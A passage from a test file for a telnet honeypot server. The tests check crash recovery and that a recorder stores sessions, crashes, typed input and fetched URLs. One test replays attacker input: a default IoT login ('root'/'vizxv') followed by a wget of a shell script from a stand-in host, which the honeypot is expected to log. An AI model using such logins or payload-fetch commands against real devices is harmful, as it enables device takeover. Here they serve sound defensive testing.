    let caps = table.filter(evs, fn(e) e.kind == "cap" end)
    test.assert_eq(table.map(caps, fn(e) e.cap end), ["line_too_long", "input_truncated", "subneg_too_long"])
    test.assert_eq(len(input_of(evs)), 65536)
  end
end

test.case("tcp: the server serves old and new connections after a registry crash") do
  with_server({}) do
    let old = whereis("honeypot_registry")
    let sock = tcp_connect("127.0.0.1", PORT)
    read_until(sock, "login: ")
    kill(old, "boom")
    let deadline = time_ms() + WAIT_MS
    while whereis("honeypot_registry") == nil or whereis("honeypot_registry") == old
      if time_ms() > deadline then error("registry not restarted") end
      sleep(10)
    end
    tcp_write(sock, "root\r\n", 1000)
    test.assert_eq(read_until(sock, "Password: "), "Password: ")
    tcp_close(sock)
    session_events()
    let again = tcp_connect("127.0.0.1", PORT)
    test.assert(string.ends_with(read_until(again, "login: "), "login: "))
    tcp_close(again)
    let evs = session_events()
    test.assert_eq(evs[1].reason, "closed")
  end
end

# Reads from `sock` until the server closes it. Raises after WAIT_MS.
fn read_to_end(sock)
  let deadline = time_ms() + WAIT_MS
  while true
    let chunk = tcp_read(sock, 65536, deadline - time_ms())
    if chunk == "" then return nil end
    if chunk == nil then error("read_to_end: the server didn't close") end
  end
end

# Syncs the recorder until `sql` returns `n` rows; returns them.
fn await_rows(sql, n)
  let deadline = time_ms() + WAIT_MS
  while true
    let file = recorder.sync("honeypot_recorder")
    let got = if file == nil then [] else rows(file, sql) end
    if len(got) == n
      return got
    end
    if time_ms() > deadline
      error("await_rows: wanted {n} rows of {sql}, got {got}")
    end
    sleep(10)
  end
end

test.case("tcp: the recorder stores sessions, crashes and their input") do
  with_dir do |dir|
    with_server({data: dir, accept_on: 1, accept_chance: 0.0}) do
      let sock = tcp_connect("127.0.0.1", PORT)
      read_until(sock, "login: ")
      let typed = "root\r\nvizxv\r\nwget http://e.x/m.sh\r\nexit\r\n"
      tcp_write(sock, typed, 1000)
      read_to_end(sock)
      tcp_close(sock)
      let s = await_rows("SELECT id, ip, end_reason, logged_in FROM sessions WHERE end_reason IS NOT NULL", 1)
      test.assert_eq([s[0].ip, s[0].end_reason, s[0].logged_in], ["127.0.0.1", "exit", 1])
      test.assert_eq(rows(recorder.sync("honeypot_recorder"), "SELECT url FROM urls"), [{url: "http://e.x/m.sh"}])
      let input = rows(recorder.sync("honeypot_recorder"), "SELECT group_concat(bytes, '') AS b FROM input WHERE session_id = {s[0].id}")
      test.assert_eq(input[0].b, typed)

      let idle = tcp_connect("127.0.0.1", PORT)
      read_until(idle, "login: ")
      tcp_write(idle, "ad", 1000)
      let live = await_rows("SELECT pid FROM sessions WHERE end_reason IS NULL", 1)
      kill(live[0].pid, "boom")
      read_to_end(idle)
      tcp_close(idle)
      let c = await_rows("SELECT c.reason, c.trace, s.end_reason, s.bytes_in FROM crashes c JOIN sessions s ON s.id = c.session_id", 1)
      test.assert_eq(c, [{reason: "boom", trace: nil, end_reason: "crash", bytes_in: nil}])
    end
  end
end

test.case("tcp: a session that raises is stored with its trace and input") do
  with_dir do |dir|
    with_server({data: dir, accept_on: "not a number"}) do
      let sock = tcp_connect("127.0.0.1", PORT)
      read_until(sock, "login: ")
      let sent = "root\r\n" + chr(0) + chr(255) + chr(255) + "pw\r\n"
      tcp_write(sock, sent, 1000)
      read_to_end(sock)
      tcp_close(sock)
      let c = await_rows("SELECT c.session_id, c.reason, c.trace, s.end_reason, s.bytes_in FROM crashes c JOIN sessions s ON s.id = c.session_id", 1)
      test.assert_eq([c[0].reason, c[0].end_reason, c[0].bytes_in], ["type error in <: got int and string", "crash", len(sent)])
      test.assert(string.contains(c[0].trace, "shell.gem"), c[0].trace)
      let input = rows(recorder.sync("honeypot_recorder"), "SELECT group_concat(bytes, '') AS b FROM input WHERE session_id = {c[0].session_id}")
      test.assert_eq(input[0].b, sent)
    end
  end
end

test.case("tcp: a killed recorder restarts and takes the live sessions over") do
  with_dir do |dir|
    with_server({data: dir, accept_on: 1, accept_chance: 0.0}) do
      let sock = tcp_connect("127.0.0.1", PORT)
      read_until(sock, "login: ")
      tcp_write(sock, "root\r\n", 1000)
      read_until(sock, "Password: ")
      await_rows("SELECT id FROM sessions", 1)
      for i = 0, 2
        let old = whereis("honeypot_recorder")
        kill(old, "kill")
        let deadline = time_ms() + WAIT_MS
        while whereis("honeypot_recorder") == nil or whereis("honeypot_recorder") == old
          if time_ms() > deadline then error("recorder not restarted") end
          sleep(10)
        end
      end
      tcp_write(sock, "pw\r\nexit\r\n", 1000)
      read_to_end(sock)
      tcp_close(sock)
      let s = await_rows("SELECT end_reason, logged_in FROM sessions WHERE end_reason IS NOT NULL", 1)
      test.assert_eq(s, [{end_reason: "exit", logged_in: 1}])
      test.assert_eq(rows(recorder.sync("honeypot_recorder"), "SELECT count(*) AS n FROM sessions"), [{n: 1}])
    end
  end
end

test.run()
